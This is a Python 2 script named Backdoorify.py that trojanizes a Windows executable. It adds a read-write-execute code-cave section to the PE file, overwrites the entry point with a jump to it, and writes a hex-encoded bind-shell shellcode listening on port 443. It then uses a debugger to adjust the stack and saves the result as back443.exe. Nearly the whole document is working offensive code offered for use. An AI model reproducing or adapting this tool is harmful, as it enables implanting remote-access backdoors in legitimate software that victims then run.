#!/usr/bin/env python
print "#########################################################################"
print "#			Author: n1ghtc4awl3r				#"
print "#			Code: Backdoorify.py				#"
print "#			 Date: 28-Oct-2017					#"
print "#			License: Bhak BoshDK				#"
print "#########################################################################"
try:
	print "[+]Importing modules..."
	import pefile
	import pydasm
	import struct
	import sys
	import pykd
	import time
	import SectionDoubleP
except Exception,e:
	print "[-]Module dependencies not met!"
	print "[-]Exception: " + str(e)
	sys.exit(-1)
	
#First add section into the file to be backdoored
print "[+]Enter file name to be backdoored"
exe_file = raw_input("Enter full file pathname: ")
pe = pefile.PE(exe_file)
print "[+]Reading file sections..."
sections = SectionDoubleP.SectionDoubleP(pe)
time.sleep(0.5)

try:
	print "[+]\tAdding Rawsize, VirtualSize of 0x1000, Header marked [R+W+X]"
	sections.push_back(VirtualSize=0x00001000, RawSize=0x00001000, Characteristics=0xE0000020)
	time.sleep(1.0)
	print "[+]\tNew PE section added..."
except SectionDoublePError as e:
	print e
pe.write(filename="tempCave.exe")
time.sleep(0.5)
print "[+]Code caving successful..."

print "=============================\n"

#exe_path = raw_input("Enter exe path: ")
#print "[+]Starting the executable"
print "[+]Started file analysis"
pykd.startProcess("tempCave.exe")
print "[+]setting entry point breakpoint"
pykd.dbgCommand("bp $exentry")
print "[+]stepping into breakpoint"
pykd.dbgCommand("g")
print "[+]Fetching address of esp @entryPoint"
#print "[+]" + str(pykd.dbgCommand("r esp"))
initial_esp = str(pykd.dbgCommand("r esp"))
#print type(initial_esp)
initial_esp = initial_esp.split("=")[1]
#print "splitted..." + initial_esp
initial_esp = "0x"+initial_esp
print "[+]Initial ESP: " + initial_esp
initial_esp = int(initial_esp,16)

time.sleep(1)

print "[+]Analyzing exe for entry point address..."
pe = pefile.PE("tempCave.exe")
ep = pe.OPTIONAL_HEADER.AddressOfEntryPoint
ep_ava = ep+pe.OPTIONAL_HEADER.ImageBase
data = pe.get_memory_mapped_image()[ep:ep+10]
offset = 0
save_instr = []
d = {}

while offset < len(data):
	i = pydasm.get_instruction(data[offset:], pydasm.MODE_32)
	print "i: " + str(i)
	instr = pydasm.get_instruction_string(i, pydasm.FORMAT_INTEL, ep_ava+offset)
	save_instr.append(instr)
	interim = str(hex(ep_ava+offset))
	d[interim] = instr
	offset += i.length
	
print "dictionary:"
print d
print "[+]Saving initial instructions: "
print save_instr

"""
	Trying to get the physical address of each pe section
	In optional_headers there is ImageBase. This seems to be the base offset of  pe file
	so: physcial address = virtual address + ImageBase
"""
time.sleep(1)

pristine = 0
baseAddr = pe.OPTIONAL_HEADER.ImageBase
print "[+]Rechecking PE file sections..."
for section in pe.sections:
	print "[-]searching custom PE section..."
	#print section.Name + ":" + " Physical Address: " + str(hex(section.VirtualAddress+baseAddr))
	#strip '\x00' lurking after section name. U aint gonna see 'em on screen
	section.Name = section.Name.rstrip('\x00')
	if section.Name == ".robed":
		#start operating on this section
		#first write jmp <
		print "\t[+].robed section found" + " Physical Address: " + str(hex(section.VirtualAddress+baseAddr)) + " !"
		robed_VA = hex(section.VirtualAddress)
		robed_strtAddress = hex(section.VirtualAddress+baseAddr)
		print "\t[+]Absolute address of .robed section: " + str(robed_strtAddress)
		print "\t[+]Hijacking code flow"
		pristine = pristine + 1
	else:
		pristine = pristine * 0 #clear variable
		pass
if(pristine == 0):
	print "\t[+]This file was not code caved..."
	print "[+]Exiting..."
	sys.exit(1)

#print "robed_address: " + str(robed_strtAddress)	
#print "base_addr: " + str(ep_ava)
call_address = int(robed_strtAddress,16) - int(ep_ava) - 5 #the call_address is integer value
call_address =  hex( struct.unpack( '<L', struct.pack('>L', call_address) ) [0] ) [2:] #this should return something like: 38b50000
#print call_address

print "\t[+]Generating unconditional jump opcode"
jmp_address = call_address
jmp_opcodes = "\\xe9" + "\\x" + call_address[0:2] + "\\x" + call_address[2:4] + "\\x" + call_address[4:6] + "\\x" + call_address[6:8]
print "\t[+]opcodes: " + jmp_opcodes

jmp_opcodes = jmp_opcodes.split('\\x')[1:]
#print jmp_opcodes

ep_hex = hex(ep)
#print "ep_hex type: " + str(type(ep_hex))
#print "ep_hex value: " + ep_hex

#overwriting entrypoint address
print "\t[+]overwriting entrypoint with a jump to code cave"
ep_hex = int(ep_hex,16)
for instruction in jmp_opcodes:
	#print "injecting value: " + instruction + " injecting at: " + str(ep_hex)
	instruction = int(instruction,16)
	status = pe.set_bytes_at_rva(ep_hex,chr(instruction))
	if(status is False):
		print "[!]entry point hijacking failed..."
	ep_hex = ep_hex +  1

time.sleep(1)

print "[+]Program EntryPoint hijack successful!"
print "[+]Editing code cave..."
print "\t[+]Pushing registers and flags in stack"
robed_VA = int(robed_VA,16)
status = pe.set_bytes_at_rva(robed_VA, chr(0x60)) #pushad
#print status
robed_VA = robed_VA+1
print "pushdf address: " + str(hex(robed_VA))
pe.set_bytes_at_rva(robed_VA, chr(0x9c)) #pushfd
#print status
print "\t[+]register and flags saved!"
print "\t[+]working on ESP..."

#Next will be shellcode, this shellcode has been tuned for backdoor bind shell
print "\t[+]Writing a bind shellcode @port 443"
shellcode = "fce8820000006089e531c0648b50308b520c8b52148b72280fb74a2631ffac3c617c022c20c1cf0d01c7e2f252578b52108b4a3c8b4c1178e34801d1518b592001d38b4918e33a498b348b01d631ffacc1cf0d01c738e075f6037df83b7d2475e4588b582401d3668b0c4b8b581c01d38b048b01d0894424245b5b61595a51ffe05f5f5a8b12eb8d5d6833320000687773325f54684c772607ffd5b89001000029c454506829806b00ffd56a085950e2fd4050405068ea0fdfe0ffd59768020001bb89e66a10565768c2db3767ffd55768b7e938ffffd5576874ec3be1ffd5579768756e4d61ffd568636d640089e357575731f66a125956e2fd66c744243c01018d442410c60044545056565646564e565653566879cc3f86ffd589e0905690ff306808871d60ffd5bbfe0e32ea68a695bd9dffd53c067c0a80fbe07505bb4713726f6a0053ffd5"
shellcode_len = len(shellcode)
write_code = []

#making instruction list
for i in range(0,shellcode_len,2):
	write_code.append(shellcode[i:i+2])

number_of_instructions = len(write_code)

#setting EIP to the next memory location to write
robed_VA = robed_VA + 1

#writing shellcode
count = 0
while(number_of_instructions > 0):
	pe.set_bytes_at_rva(robed_VA, chr(0x9c))
	shellcode_instruction = "0x" + write_code[count]
	shellcode_instruction = int(shellcode_instruction, 16)
	status = pe.set_bytes_at_rva(robed_VA,chr(shellcode_instruction))
#	print "injecting value: " + str(hex(shellcode_instruction)) + " injecting at: " + str(hex(robed_VA))
#	print status
	robed_VA = robed_VA + 1	#increment to next instruction pointer
	count = count + 1 		#increment the write_code counter to write the next instruction of shellcode
#	if count> 10:
#		break
	number_of_instructions = number_of_instructions - 1 #decrement number_of_instructions until zero to stop while loop
print "[+]Shellcode successfully written"

#set ESP to original value
#
#stack_adjust_instr = [0x81, 0xc4, 0x1c, 0x02, 0x00, 0x00]
#for instr in stack_adjust_instr:
#	print "\t[*]instruction opcode: " + str(instr)
#	pe.set_bytes_at_rva(robed_VA, chr(instr))
#	robed_VA = robed_VA + 1

#rewrite original instruction:

	
#pe.set_bytes_at_rva(robed_VA, chr(0x9d)) #popfd
#robed_VA = robed_VA + 1
#pe.set_bytes_at_rva(robed_VA, chr(0x61)) #popad
#robed_VA = robed_VA + 1
#print (pe.OPTIONAL_HEADER.ImageBase)
print "current EIP address: " + str(hex(pe.OPTIONAL_HEADER.ImageBase + robed_VA))
final_eip = hex(pe.OPTIONAL_HEADER.ImageBase + robed_VA)

pe.write(filename="tmp.exe")

print "[+]Starting the temporary executable"
pykd.startProcess("tmp.exe")
print "\t[+]setting final breakpoint"
bpCmd = "bp " + final_eip
pykd.dbgCommand(bpCmd)
print "\t[+]stepping into breakpoint"
print "\t[+]make a connection to the host at port 443"
print "\t[+]waiting..."
pykd.dbgCommand("g")
print "\t[+]Fetching address of esp @entryPoint"
print "\t[+]" + str(pykd.dbgCommand("r esp")).replace("=",":")
final_esp = str(pykd.dbgCommand("r esp"))
print final_esp
print "[+]processing esp..."
time.sleep(0.5)
final_esp = final_esp.split("=")[1]
final_esp = "0x"+final_esp
final_esp = int(final_esp,16)
print "\t[+]Final esp: " + str(final_esp)

print "\t[+]calculating esp difference"
esp_difference = str(initial_esp - final_esp)
#print esp_difference
#print str(struct.pack('<I',int(esp_difference)))
print "\t[+]constructing jmp esp opcode..."
jmp_esp = "\x81\xC4\\" + str(struct.pack('<I',int(esp_difference)))
jmp_esp = jmp_esp.split("\\")
jmp_esp_opcodes = jmp_esp[0] + jmp_esp[1]

print "[+]Restoring stack to pre-hijacked state"

for instruction in jmp_esp_opcodes:
	try:
		status = pe.set_bytes_at_rva(robed_VA, instruction)
		robed_VA = robed_VA + 1
	except Exception,e:
		print "\t[+]Exception occured: " + str(e)
		exit()
#popfd/ad instruction:
pe.set_bytes_at_rva(robed_VA, chr(0x9d)) #popfd
robed_VA = robed_VA + 1
pe.set_bytes_at_rva(robed_VA, chr(0x61)) #popad
robed_VA = robed_VA + 1

print "[+]stack reversed to pre-hijack state"
time.sleep(1)

#rewrite the original instructions

print "[+]Saving changes to file called back443.exe"
#out_file = raw_input("Enter name of backdoored file: ")

try:
	pe.write(filename="back443.exe")
	print "[+]Save successful... Exiting..."
	print "[+]Backdooring successful"
	sys.exit(0)
except Exception,e:
	print str(e)
	print "[!]failed..."
	sys.exit(2)
